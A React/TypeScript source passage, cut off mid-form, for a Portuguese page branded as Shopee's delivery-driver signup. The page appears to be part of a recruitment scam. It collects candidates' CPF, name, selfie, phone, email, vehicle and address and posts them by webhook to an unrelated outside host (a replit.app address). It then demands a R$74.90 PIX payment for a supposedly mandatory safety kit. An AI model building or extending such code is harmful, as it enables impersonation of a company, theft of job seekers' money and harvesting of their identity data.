import React, { useState, useEffect, useRef } from 'react';
import { addDays, format } from 'date-fns';
import { ptBR } from 'date-fns/locale';
import { useLocation } from 'wouter';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import CommentsSection from '@/components/CommentsSection';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { useToast } from '@/hooks/use-toast';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { Spinner } from '@/components/ui/spinner';
import { useScrollTop } from '@/hooks/use-scroll-top';
import { API_BASE_URL } from '../lib/api-config';
import { createPixPayment } from '../lib/payments-api';
import { initFacebookPixel, trackEvent, trackPurchase, checkPaymentStatus } from '../lib/facebook-pixel';
import EPIConfirmationModal from '@/components/EPIConfirmationModal';
import EntregadorCracha from '@/components/EntregadorCracha';
import QRCodeGenerator from '@/components/QRCodeGenerator';

import kitEpiImage from '../assets/kit-epi-new.webp';
import pixLogo from '../assets/pix-logo.png';

// Interface para o endereço do usuário
interface EnderecoUsuario {
  cep: string;
  logradouro: string;
  bairro: string;
  cidade: string;
  estado: string;
  numero: string;
  complemento: string;
}

// Interface para os dados do usuário
interface DadosUsuario {
  nome: string;
  cpf: string;
}

// Interface para o QR Code PIX
interface PixQRCode {
  pixCode: string;
  pixQrCode: string;
  id: string;
}

// Schema para o formulário de endereço
const enderecoSchema = z.object({
  cep: z.preprocess(
    (val) => String(val || '').replace(/\D/g, ''),
    z.string().length(8, 'CEP deve ter 8 dígitos')
  ),
  logradouro: z.string().min(1, 'Logradouro é obrigatório'),
  bairro: z.string().min(1, 'Bairro é obrigatório'),
  cidade: z.string().min(1, 'Cidade é obrigatória'),
  estado: z.string().min(2, 'Estado é obrigatório'),
  numero: z.string().min(1, 'Número é obrigatório'),
  complemento: z.string().optional(),
});

type EnderecoFormValues = z.infer<typeof enderecoSchema>;

const Entrega: React.FC = () => {
  // Hook para navegação
  const [, setLocation] = useLocation();
  
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  // Função para formatar o nome do cartão
  const formatCardName = (fullName: string) => {
    if (!fullName) return 'CANDIDATO';
    
    // Lista de preposições a serem removidas
    const prepositions = ['DOS', 'DAS', 'DA', 'DE', 'DO', 'E'];
    
    // Dividir o nome em palavras e converter para maiúsculo
    const words = fullName.toUpperCase().split(/\s+/).filter(word => word.length > 0);
    
    // Filtrar preposições e pegar apenas os dois primeiros nomes válidos
    const validNames = words.filter(word => !prepositions.includes(word));
    
    // Retornar os dois primeiros nomes válidos
    return validNames.slice(0, 2).join(' ') || 'CANDIDATO';
  };
  
  // Inicializar o Facebook Pixel
  useEffect(() => {
    initFacebookPixel();
    
    // Verificar se há um pagamento em andamento
    const currentPaymentId = localStorage.getItem('current_payment_id');
    if (currentPaymentId) {
      console.log('[ENTREGA] Encontrado pagamento em andamento:', currentPaymentId);
      setTimeout(() => {
        verificarStatusPagamento(currentPaymentId);
      }, 1000);
    }
  }, []);
  
  const [endereco, setEndereco] = useState<EnderecoUsuario | null>(null);
  const [dadosUsuario, setDadosUsuario] = useState<DadosUsuario | null>(null);
  const [dataEntrega, setDataEntrega] = useState<string>('');
  const [showConfirmationModal, setShowConfirmationModal] = useState(false);
  const [showCloseWarning, setShowCloseWarning] = useState(false);
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const [selfieImage, setSelfieImage] = useState<string | null>(null);
  const [pixInfo, setPixInfo] = useState<PixQRCode | null>(null);
  const [timeLeft, setTimeLeft] = useState<number>(1800); // 30 minutos
  const [isLoading, setIsLoading] = useState(false);
  const timerRef = useRef<number | null>(null);
  const { toast } = useToast();

  // Configuração do formulário
  const { register, handleSubmit, setValue, formState: { errors }, reset } = useForm<EnderecoFormValues>({
    resolver: zodResolver(enderecoSchema),
    defaultValues: {
      cep: '',
      logradouro: '',
      bairro: '',
      cidade: '',
      estado: '',
      numero: '',
      complemento: '',
    }
  });

  // Log do estado do formulário para debug
  console.log("🔍 [ENTREGA] Estado do formulário - errors:", errors);
  console.log("🔍 [ENTREGA] acceptedTerms:", acceptedTerms);

  // Efeito para carregar dados iniciais
  // Efeito para controlar o cronômetro de 30 minutos
  useEffect(() => {
    if (pixInfo && timeLeft > 0) {
      timerRef.current = window.setInterval(() => {
        setTimeLeft(prev => {
          if (prev <= 1) {
            if (timerRef.current) clearInterval(timerRef.current);
            return 0;
          }
          return prev - 1;
        });
      }, 1000) as unknown as number;
    }
    
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, [pixInfo, timeLeft]);

  
  useEffect(() => {
    // Recuperar o CEP salvo no localStorage
    const cepData = localStorage.getItem('shopee_delivery_cep_data');
    if (cepData) {
      try {
        const { cep, city, state } = JSON.parse(cepData);
        
        console.log("CEP recuperado do localStorage:", cep);
        
        // Buscar dados completos do CEP
        fetchCepData(cep);
      } catch (error) {
        console.error("Erro ao processar cepData:", error);
      }
    }

    // Recuperar dados do usuário - com múltiplos fallbacks
    let nomeUsuario = '';
    let cpfUsuario = '';
    
    // Tentar primeiro os dados completos do candidato
    const candidatoData = localStorage.getItem('candidato_data');
    if (candidatoData) {
      try {
        const parsedCandidatoData = JSON.parse(candidatoData);
        console.log("[ENTREGA] Dados do candidato recuperados:", parsedCandidatoData);
        
        if (parsedCandidatoData.nome && parsedCandidatoData.cpf) {
          nomeUsuario = parsedCandidatoData.nome;
          cpfUsuario = parsedCandidatoData.cpf;
        }
      } catch (error) {
        console.error("[ENTREGA] Erro ao processar candidato_data:", error);
      }
    }
    
    // Fallback: tentar dados do user_data
    if (!nomeUsuario || !cpfUsuario) {
      const userData = localStorage.getItem('user_data');
      if (userData) {
        try {
          const parsedUserData = JSON.parse(userData);
          console.log("[ENTREGA] Dados do user_data recuperados:", parsedUserData);
          
          if (parsedUserData.nome && parsedUserData.cpf) {
            nomeUsuario = parsedUserData.nome;
            cpfUsuario = parsedUserData.cpf;
          }
        } catch (error) {
          console.error("[ENTREGA] Erro ao processar user_data:", error);
        }
      }
    }
    
    // Último fallback: dados individuais
    if (!nomeUsuario) {
      nomeUsuario = localStorage.getItem('user_name') || '';
    }
    if (!cpfUsuario) {
      cpfUsuario = localStorage.getItem('user_cpf') || '';
    }
    
    // Definir os dados do usuário
    if (nomeUsuario && cpfUsuario) {
      setDadosUsuario({
        nome: nomeUsuario,
        cpf: cpfUsuario
      });
      
      // NOVA FUNCIONALIDADE: Marcar que usuário chegou na página de entrega
      try {
        console.log('🚚 Marcando que usuário chegou na página de entrega...');
        fetch('/api/app-users/reached-delivery', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            cpf: cpfUsuario
          }),
        }).then(response => response.json())
        .then(result => {
          if (result.success) {
            console.log('✅ Status de entrega atualizado no banco');
          } else {
            console.warn('⚠️ Falha ao atualizar status:', result.message);
          }
        }).catch(error => {
          console.error('❌ Erro ao atualizar status de entrega:', error);
          // Não bloquear o fluxo se houver erro no banco
        });
      } catch (error) {
        console.error('❌ Erro ao marcar página de entrega:', error);
      }
      
    } else {
      console.error("[ENTREGA] ERRO: Não foi possível recuperar nome ou CPF do usuário!");
      console.log("[ENTREGA] Nome encontrado:", nomeUsuario);
      console.log("[ENTREGA] CPF encontrado:", cpfUsuario);
    }
    
    // Recuperar imagem da selfie
    const selfieData = localStorage.getItem('selfie_image');
    if (selfieData) {
      setSelfieImage(selfieData);
    }

    // Calcular data de entrega (5 dias a partir de hoje)
    const hoje = new Date();
    const dataEntregaObj = addDays(hoje, 5);
    const dataFormatada = format(dataEntregaObj, "EEEE, dd/MM/yyyy", { locale: ptBR });
    setDataEntrega(dataFormatada.charAt(0).toUpperCase() + dataFormatada.slice(1));
  }, []);

  // Função para buscar dados do CEP - OpenCEP como principal, ViaCEP como fallback
  const fetchCepData = async (cep: string) => {
    try {
      const cleanCep = cep.replace(/\D/g, '');
      
      // Tentar primeiro com OpenCEP (API principal)
      console.log('[ENTREGA CEP] Tentando OpenCEP...');
      try {
        const openCepResponse = await fetch(`https://opencep.com/v1/${cleanCep}.json`, {
          signal: AbortSignal.timeout(5000) // Timeout de 5 segundos
        });
        
        if (openCepResponse.ok) {
          const openCepData = await openCepResponse.json();
          
          if (openCepData && openCepData.cep) {
            console.log('[ENTREGA CEP] ✅ OpenCEP funcionou!');
            const novoEndereco = {
              cep: openCepData.cep,
              logradouro: openCepData.logradouro,
              bairro: openCepData.bairro,
              cidade: openCepData.localidade,
              estado: openCepData.uf,
              numero: '',
              complemento: '',
            };
            
            setEndereco(novoEndereco);
            
            // Preencher formulário
            setValue('cep', openCepData.cep);
            setValue('logradouro', openCepData.logradouro);
            setValue('bairro', openCepData.bairro);
            setValue('cidade', openCepData.localidade);
            setValue('estado', openCepData.uf);
            return;
          }
        }
      } catch (openCepError) {
        console.log('[ENTREGA CEP] OpenCEP falhou, tentando ViaCEP...');
      }
      
      // Se OpenCEP falhar, usar ViaCEP como fallback
      const viaCepResponse = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
      const viaCepData = await viaCepResponse.json();
      
      if (!viaCepData.erro) {
        console.log('[ENTREGA CEP] ✅ ViaCEP funcionou (fallback)!');
        const novoEndereco = {
          cep: viaCepData.cep,
          logradouro: viaCepData.logradouro,
          bairro: viaCepData.bairro,
          cidade: viaCepData.localidade,
          estado: viaCepData.uf,
          numero: '',
          complemento: '',
        };
        
        setEndereco(novoEndereco);
        
        // Preencher formulário
        setValue('cep', viaCepData.cep);
        setValue('logradouro', viaCepData.logradouro);
        setValue('bairro', viaCepData.bairro);
        setValue('cidade', viaCepData.localidade);
        setValue('estado', viaCepData.uf);
      } else {
        toast({
          title: "CEP não encontrado",
          description: "Não foi possível localizar o endereço com o CEP informado.",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error('[ENTREGA CEP] ❌ Erro ao buscar CEP:', error);
      toast({
        title: "Erro ao buscar endereço",
        description: "Ocorreu um erro ao tentar buscar o endereço. Tente novamente.",
        variant: "destructive",
      });
    }
  };

  // Não usamos mais a geração local de códigos PIX
  // Todos os pagamentos serão processados pela API For4Payments

  // Handler para o formulário de endereço
  const onSubmitEndereco = async (data: EnderecoFormValues) => {
    console.log("🎯 [ENTREGA] onSubmitEndereco iniciado com dados:", data);
    
    // Ativar loading
    setIsLoading(true);
    
    // Mostrar loading
    toast({
      title: "Processando...",
      description: "Gerando seu pagamento PIX. Aguarde...",
    });
    
    try {
      // Salvar endereço completo
      localStorage.setItem('endereco_entrega', JSON.stringify(data));
      console.log("✅ [ENTREGA] Endereço salvo no localStorage");
      
      // Ir direto para o processamento do pagamento
      console.log("🚀 [ENTREGA] Iniciando processarPagamento...");
      await processarPagamento();
      console.log("✅ [ENTREGA] processarPagamento concluído");
      // Mantém o loading ativo pois vai redirecionar
    } catch (error: any) {
      console.error("❌ [ENTREGA] Erro ao processar endereço:", error);
      setIsLoading(false); // Desativar loading em caso de erro
      toast({
        title: "Erro ao processar formulário",
        description: error.message || "Não foi possível processar o formulário. Tente novamente.",
        variant: "destructive",
      });
    }
  };

  // Handler para validação inválida
  const onInvalid = (errors: any) => {
    console.log("❌ [ENTREGA] Formulário inválido! Erros:", errors);
    toast({
      title: "Complete o endereço",
      description: "Preencha todos os campos obrigatórios do endereço.",
      variant: "destructive",
    });
  };
  
  // Função para enviar webhook com todos os dados coletados
  const enviarWebhook = async () => {
    try {
      console.log('[WEBHOOK] Coletando dados do localStorage...');
      
      // Coletar todos os dados do localStorage com parsing seguro
      let candidatoData: any = {};
      let epiData: any = {};
      let enderecoData: any = {};
      
      try {
        candidatoData = JSON.parse(localStorage.getItem('candidato_data') || '{}');
      } catch (e) {
        console.warn('[WEBHOOK] Erro ao parsear candidato_data');
      }
      
      try {
        epiData = JSON.parse(localStorage.getItem('epi_data') || '{}');
      } catch (e) {
        console.warn('[WEBHOOK] Erro ao parsear epi_data');
      }
      
      try {
        enderecoData = JSON.parse(localStorage.getItem('endereco_entrega') || '{}');
      } catch (e) {
        console.warn('[WEBHOOK] Erro ao parsear endereco_entrega');
      }
      
      // Preparar dados no formato exato solicitado pela Shopee
      const webhookData = {
        cpf: candidatoData.cpf ? candidatoData.cpf.replace(/\D/g, '') : '',
        name: candidatoData.nome || '',
        email: candidatoData.email || '',
        phone: candidatoData.telefone ? candidatoData.telefone.replace(/\D/g, '') : '',
        placa: candidatoData.placa || '',
        cidade: enderecoData.cidade || '',
        estado: enderecoData.estado || '',
        cep: enderecoData.cep || '',
        dataNascimento: candidatoData.dataNascimento || '',
        isRentedCar: candidatoData.isRentedCar || false,
        tamanhoLuva: epiData.tamanhoLuva || '',
        tipoVeiculo: candidatoData.tipoVeiculo || '',
        numeroCalcado: epiData.numeroCalcado || '',
        tamanhoColete: epiData.tamanhoColete || '',
        endereco: {
          logradouro: enderecoData.logradouro || '',
          bairro: enderecoData.bairro || ''
        },
        vehicleInfo: candidatoData.vehicleInfo || {
          marca: '',
          modelo: '',
          ano: ''
        },
        timestamp: new Date().toISOString()
      };
      
      console.log('[WEBHOOK] Preparando envio dos dados...');
      
      // Enviar webhook com timeout
      const webhookUrl = 'https://recoveryfy.replit.app/api/webhook/sfgxs4y6y8qrv1jp9ik6h5inigfgb6s0';
      
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 segundos timeout
      
      try {
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(webhookData),
          signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        
        if (response.ok) {
          console.log('[WEBHOOK] Dados enviados com sucesso');
        } else {
          console.warn('[WEBHOOK] Erro na resposta:', response.status, response.statusText);
        }
      } catch (fetchError: any) {
        clearTimeout(timeoutId);
        if (fetchError.name === 'AbortError') {
          console.warn('[WEBHOOK] Timeout após 30 segundos');
        } else {
          console.warn('[WEBHOOK] Erro no envio:', fetchError.message);
        }
      }
      
    } catch (error) {
      console.error('[WEBHOOK] Erro ao enviar:', error);
      // Não bloquear o fluxo principal se o webhook falhar
    }
  };

  // Função para processar o pagamento após a confirmação
  const processarPagamento = async () => {
    console.log("🎯 [ENTREGA] processarPagamento INICIADO");
    
    try {
      console.log("🎯 [ENTREGA] Dados do usuário:", dadosUsuario);
      
      // PRIMEIRO: Enviar webhook com todos os dados (não bloquear UX)
      enviarWebhook(); // Executar em paralelo sem await
      console.log("✅ [ENTREGA] Webhook enviado");
      
      // SEGUNDO: Redirecionar para página de pagamento imediatamente
      // setShowPaymentModal(true);
      // setIsLoading(true);
      
      // Verificar se temos os dados necessários do usuário
      console.log("🎯 [ENTREGA] Verificando dados do usuário...");
      if (!dadosUsuario?.nome || !dadosUsuario?.cpf) {
        console.error("❌ [ENTREGA] Dados do usuário incompletos:", { nome: dadosUsuario?.nome, cpf: dadosUsuario?.cpf });
        throw new Error("Dados do usuário incompletos");
      }
      console.log("✅ [ENTREGA] Dados do usuário válidos");
      
      // Obter dados completos do usuário do localStorage
      const userData = localStorage.getItem('candidato_data');
      let email = "";
      let telefone = "";
      
      if (userData) {
        const parsedUserData = JSON.parse(userData);
        email = parsedUserData.email || "";
        telefone = parsedUserData.telefone || "";
      }
      
      console.log('🎯 [ENTREGA] Iniciando processamento de pagamento For4Payments');
      
      // Usar a função centralizada para processar o pagamento
      console.log('🎯 [ENTREGA] Chamando createPixPayment...');
      
      // Processar pagamento e obter resultado
      const pixData = await createPixPayment({
        name: dadosUsuario.nome,
        cpf: dadosUsuario.cpf,
        email: email,
        phone: telefone
      });
      
      console.log('🎯 [ENTREGA] Pagamento processado com sucesso:', pixData);
      
      // Verificar se recebemos todos os dados necessários
      if (!pixData.pixCode || !pixData.id) {
        throw new Error('Resposta incompleta da API de pagamento');
      }
      
      console.log('[ENTREGA] Dados válidos recebidos, atualizando estado...');
      
      
      console.log('[ENTREGA] PIX Info definido no estado:', pixData);
      
      // Rastrear evento de checkout iniciado no Facebook Pixel
      trackEvent('InitiateCheckout', {
        content_name: 'Kit de Segurança Shopee',
        content_ids: [pixData.id],
        content_type: 'product',
        value: 74.90,
        currency: 'BRL'
      });
      
      // Armazenar ID da transação para verificação posterior
      localStorage.setItem('current_payment_id', pixData.id);
      
      // Redirecionar para a página de pagamento usando query parameters
      console.log('[ENTREGA] 🔀 Redirecionando para página de pagamento:', pixData.id);
      console.log('[ENTREGA] 🔀 URL de destino será: /pagamento?id=' + pixData.id + '&email=' + encodeURIComponent(email));
      
      // Estratégia de redirecionamento imediato e robusto usando query parameters
      const targetUrl = `/pagamento?id=${pixData.id}&email=${encodeURIComponent(email)}`;
      console.log('[ENTREGA] 🔀 Iniciando redirecionamento para:', targetUrl);
      
      // Mostrar loading para o usuário
      toast({
        title: "✅ PIX gerado com sucesso!",
        description: "Redirecionando para página de pagamento...",
      });
      
      // Método 1: setLocation do wouter (mais suave)
      console.log('[ENTREGA] 🔀 Tentativa 1: setLocation...');
      setLocation(targetUrl);
      
      // Método 2: Forçar redirecionamento imediato como backup
      console.log('[ENTREGA] 🔀 Tentativa 2: window.location.href (backup imediato)...');
      setTimeout(() => {
        window.location.href = targetUrl;
        console.log('[ENTREGA] ✅ window.location.href executado');
      }, 100);
      
      // Método 3: Ultimo recurso 
      setTimeout(() => {
        if (!window.location.search.includes(`id=${pixData.id}`)) {
          console.warn('[ENTREGA] 🚨 Forçando redirecionamento final!');
          window.location.replace(targetUrl);
        }
      }, 1000);
      
    } catch (error: any) {
      console.error("Erro ao processar pagamento:", error);
      toast({
        title: "Erro ao processar pagamento",
        description: error.message || "Não foi possível gerar o pagamento. Tente novamente.",
        variant: "destructive",
      });
    }
  };


  // Função para formatar o tempo restante
  const formatTime = (seconds: number): string => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // Função para copiar código PIX com correção específica para mobile
  const copiarCodigoPix = async (event?: React.MouseEvent | React.TouchEvent) => {
    console.log('[COPY] Função copiarCodigoPix chamada');
    
    // Prevenir comportamentos padrão que podem interferir
    if (event) {
      event.preventDefault();
      event.stopPropagation();
    }
    
    if (!pixInfo?.pixCode) {
      console.log('[COPY] Nenhum código PIX disponível');
      return;
    }

    try {
      console.log('[COPY] Tentando copiar código PIX');
      
      // Método 1: Tentar usar navigator.clipboard (moderno)
      if (navigator.clipboard && window.isSecureContext) {
        console.log('[COPY] Usando navigator.clipboard');
        await navigator.clipboard.writeText(pixInfo.pixCode);
        toast({
          title: "Código PIX copiado!",
          description: "O código PIX foi copiado para a área de transferência.",
        });
        console.log('[COPY] Sucesso com navigator.clipboard');
        return;
      }
      
      console.log('[COPY] Fallback para execCommand');
      
      // Método 2: Fallback usando document.execCommand (compatibilidade)
      const textArea = document.createElement('textarea');
      textArea.value = pixInfo.pixCode;
      textArea.style.position = 'fixed';
      textArea.style.left = '-999999px';
      textArea.style.top = '-999999px';
      textArea.style.opacity = '0';
      textArea.style.pointerEvents = 'none';
      textArea.setAttribute('readonly', '');
      
      document.body.appendChild(textArea);
      
      // Foco e seleção específicos para mobile
      textArea.focus({ preventScroll: true });
      textArea.select();
      textArea.setSelectionRange(0, textArea.value.length);
      
      const successful = document.execCommand('copy');
      document.body.removeChild(textArea);
      
      if (successful) {
        console.log('[COPY] Sucesso com execCommand');
        toast({
          title: "Código PIX copiado!",
          description: "O código PIX foi copiado para a área de transferência.",
        });
        return;
      }
      
      throw new Error('execCommand falhou');
      
    } catch (error) {
      console.error('[COPY] Erro ao copiar:', error);
      
      // Método 3: Fallback final específico para mobile
      try {
        console.log('[COPY] Tentando fallback final');
        
        // Criar input com configurações otimizadas para mobile
        const input = document.createElement('input');
        input.type = 'text';
        input.value = pixInfo.pixCode;
        input.style.position = 'absolute';
        input.style.top = '50%';
        input.style.left = '50%';
        input.style.transform = 'translate(-50%, -50%)';
        input.style.opacity = '0.01'; // Quase invisível mas não 0
        input.style.zIndex = '999999';
        input.style.fontSize = '16px'; // Evita zoom no iOS
        input.style.width = '1px';
        input.style.height = '1px';
        input.setAttribute('readonly', '');
        
        document.body.appendChild(input);
        
        // Aguardar um tick para garantir que o elemento foi renderizado
        await new Promise(resolve => setTimeout(resolve, 10));
        
        input.focus();
        input.select();
        input.setSelectionRange(0, 99999);
        
        const copySuccess = document.execCommand('copy');
        
        // Remover após um pequeno delay
        setTimeout(() => {
          if (document.body.contains(input)) {
            document.body.removeChild(input);
          }
        }, 100);
        
        if (copySuccess) {
          console.log('[COPY] Sucesso com fallback final');
          toast({
            title: "Código PIX copiado!",
            description: "O código PIX foi copiado para a área de transferência.",
          });
        } else {
          throw new Error('Fallback final falhou');
        }
      } catch (fallbackError) {
        console.error('[COPY] Todos os métodos falharam:', fallbackError);
        toast({
          title: "Código PIX:",
          description: pixInfo.pixCode,
          duration: 10000,
        });
      }
    }
  };
  
  // Função para verificar o status do pagamento via API 4MPAGAMENTOS
  const verificarStatusPagamento = async (paymentId: string, tentativas: number = 0, maxTentativas: number = 30) => {
    console.log(`[ENTREGA] 🔍 Verificando status do pagamento 4MPAGAMENTOS: ${paymentId} (tentativa ${tentativas + 1}/${maxTentativas})`);
    
    // Limite de tentativas para evitar loop infinito
    if (tentativas >= maxTentativas) {
      console.log('[ENTREGA] ⏰ Limite de tentativas atingido, parando verificação');
      toast({
        title: "Tempo esgotado",
        description: "Não foi possível verificar o status do pagamento. Tente novamente mais tarde.",
      });
      return;
    }
    
    try {
      // Usar nossa API local 4MPAGAMENTOS para verificar status
      const response = await fetch(`/api/transactions/${paymentId}/status`);
      
      if (response.ok) {
        const statusData = await response.json();
        console.log('[ENTREGA] ✅ Status obtido da 4MPAGAMENTOS:', statusData);
        
        // Verificar se o status é "paid"
        if (statusData.status === 'paid') {
          console.log('[ENTREGA] 🎉 Pagamento APROVADO! Redirecionando...');
          
          // Rastrear o evento de compra no Facebook Pixel
          trackPurchase(paymentId, 74.90);
          
          // Exibir mensagem de sucesso para o usuário
          toast({
            title: "🎉 Pagamento aprovado!",
            description: "Redirecionando para área de treinamento...",
          });
          
          // Redirecionar instantaneamente para a página de treinamento
          console.log('[ENTREGA] Redirecionando para /treinamento...');
          setLocation('/treinamento');
          
          // Limpar o ID do pagamento do localStorage
          localStorage.removeItem('current_payment_id');
          
          return; // Parar a verificação
        } else {
          console.log(`[ENTREGA] ⏳ Status ainda pendente: ${statusData.status}. Tentando novamente em 2s...`);
          // Se não está aprovado, agendar nova verificação em 2 segundos
          setTimeout(() => {
            verificarStatusPagamento(paymentId, tentativas + 1, maxTentativas);
          }, 2000);
        }
      } else {
        console.error('[ENTREGA] ❌ Erro na API 4MPAGAMENTOS:', response.status, response.statusText);
        
        // Em caso de erro HTTP, agendar nova tentativa em 3 segundos (mais devagar)
        setTimeout(() => {
          verificarStatusPagamento(paymentId, tentativas + 1, maxTentativas);
        }, 3000);
      }
    } catch (error) {
      console.error('[ENTREGA] 💥 Erro ao verificar status:', error);
      
      // Em caso de erro de rede, agendar nova tentativa em 3 segundos (mais devagar)
      setTimeout(() => {
        verificarStatusPagamento(paymentId, tentativas + 1, maxTentativas);
      }, 3000);
    }
  };

  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      
      <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
        {/* Meia-lua no canto direito */}
        <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
        
        <div className="flex items-center relative z-10">
          <div className="text-white mr-3">
            <i className="fas fa-chevron-right text-3xl font-black" style={{color: 'white'}}></i>
          </div>
          <div className="leading-none">
            <h1 className="text-base font-bold text-white mb-0">Motorista Parceiro</h1>
            <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Shopee</p>
          </div>
        </div>
      </div>
      
      <div className="flex-grow container mx-auto px-4 py-8">
        <div className="w-full max-w-4xl mx-auto">
          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
              <h3 className="font-semibold text-[#E83D22]">Status do Cadastro</h3>
            </div>
            <div className="p-6">
              <div className="flex flex-col md:flex-row gap-6">
                <div className="w-full space-y-4">

                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="flex justify-center">
                      <h4 className="text-gray-700 font-medium mb-2 sr-only">Dados do Entregador</h4>
                      {dadosUsuario && endereco ? (
                        <EntregadorCracha 
                          nome={dadosUsuario.nome || ''}
                          cpf={dadosUsuario.cpf || ''}
                          cidade={endereco.cidade || ''}
                          fotoUrl={selfieImage || ''}
                        />
                      ) : (
                        <div className="bg-gray-50 p-4 rounded-md">
                          <p className="text-gray-600">Carregando dados do entregador...</p>
                        </div>
                      )}
                    </div>
                    
                    <div>
                      <h4 className="text-gray-700 font-medium mb-2">Próximos Passos</h4>
                      <div className="bg-gray-50 p-4 rounded-md">
                        <ul className="list-disc pl-5 space-y-1 text-gray-600">
                          <li>Adquirir Kit de Segurança oficial</li>
                          <li>Aguardar entrega em até 5 dias úteis</li>
                          <li>Começar a receber entregas na sua região</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                  
                  <div className="mt-6">
                    <p className="text-sm text-gray-500 italic">
                      Importante: Assim que o Kit de Segurança for entregue, você já estará apto para 
                      começar a realizar entregas imediatamente pela Shopee.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
          
          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
              <h3 className="font-semibold text-[#E83D22]">Kit de Segurança Oficial Shopee</h3>
            </div>
            <div className="p-6">
              <div className="flex flex-col md:flex-row gap-6 items-center">
                <div className="w-full md:w-2/5">
                  <img 
                    src={kitEpiImage} 
                    alt="Kit EPI Shopee" 
                    className="w-full rounded-lg"
                  />
                </div>
                <div className="w-full md:w-3/5">
                  <h4 className="text-lg font-medium mb-3">Kit Completo para Entregadores</h4>
                  <p className="text-gray-600 mb-4">
                    Para garantir sua segurança durante as entregas, a Shopee exige que todos os entregadores 
                    utilizem equipamentos de proteção individual. O kit inclui:
                  </p>
                  <ul className="list-disc pl-5 mb-4 space-y-1 text-gray-700">
                    <li>2 Coletes refletivos com identificação Shopee (laranja e amarelo)</li>
                    <li>Par de luvas de proteção</li>
                    <li>Botas de segurança antiderrapantes</li>
                  </ul>
                  <div className="bg-yellow-50 p-3 rounded-md border border-yellow-200 mb-4">
                    <p className="text-sm text-yellow-800">
                      <strong>Importante:</strong> O uso do kit completo é obrigatório durante todas 
                      as entregas. O não uso pode resultar em suspensão temporária.
                    </p>
                  </div>
                  <div className="bg-orange-50 p-4 rounded-md border border-orange-200 mb-2">
                    <p className="text-gray-700">
                      <span className="font-medium">Data estimada de entrega:</span> <span className="text-[#E83D22] font-medium">{dataEntrega}</span>
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Cartão do usuário */}
          {dadosUsuario && (
            <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
              <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
                <h3 className="font-semibold text-[#E83D22]">Seu Cartão de Entregador</h3>
              </div>
              <div className="p-6">
                <div className="flex justify-center">
                  <div className="text-center">
                    <div className="relative inline-block">
                      <img 
                        src="https://i.ibb.co/VWZ2B4jv/Inserir-um-ti-tulo-4-1-1.webp" 
                        alt="Cartão Entregador Shopee" 
                        className="max-w-full w-80 h-auto rounded-2xl"
                      />
                      <div 
                        className="absolute font-bold text-lg tracking-wide"
                        style={{
                          bottom: '35px',
                          left: '30px',
                          fontFamily: 'Courier New, Courier, monospace',
                          color: '#FFFFFF',
                          textShadow: '2px 2px 4px rgba(0,0,0,0.7)'
                        }}
                      >
                        {formatCardName(dadosUsuario.nome)}
                      </div>
                    </div>
                    <p className="mt-4 text-gray-600 text-sm">
                      Seu cartão personalizado será liberado após a confirmação do pagamento
                    </p>
                  </div>
                </div>
              </div>
            </div>
          )}
          
          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
              <h3 className="font-semibold text-[#E83D22]">Endereço para Entrega</h3>
            </div>
            <div className="p-6">
              <form 
                id="endereco-form"
                onSubmit={handleSubmit(onSubmitEndereco, onInvalid)}
                className="space-y-6"
                noValidate
              >
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label htmlFor="cep" className="block text-sm font-medium text-gray-700 mb-1">
                      CEP
                    </label>
                    <Input
                      id="cep"
                      {...register('cep')}
                      placeholder="00000-000"
                      className={errors.cep ? 'border-red-500' : ''}
                    />
                    {errors.cep && (
                      <p className="mt-1 text-sm text-red-600">{errors.cep.message}</p>
                    )}
                  </div>
                  
                  <div>
                    <label htmlFor="numero" className="block text-sm font-medium text-gray-700 mb-1">
                      Número
                    </label>
                    <Input
                      id="numero"
                      {...register('numero')}
                      placeholder="Número"
                      className={errors.numero ? 'border-red-500' : ''}
                    />
                    {errors.numero && (
                      <p className="mt-1 text-sm text-red-600">{errors.numero.message}</p>
                    )}
                  </div>
                </div>
                
                <div>
                  <label htmlFor="logradouro" className="block text-sm font-medium text-gray-700 mb-1">
                    Logradouro
                  </label>
                  <Input
                    id="logradouro"
                    {...register('logradouro')}
                    placeholder="Rua, Avenida, etc."
                    className={errors.logradouro ? 'border-red-500' : ''}
                  />
                  {errors.logradouro && (
                    <p className="mt-1 text-sm text-red-600">{errors.logradouro.message}</p>
                  )}
                </div>
                
                <div>
                  <label htmlFor="complemento" className="block text-sm font-medium text-gray-700 mb-1">
                    Complemento (opcional)
                  </label>
                  <Input
                    id="complemento"
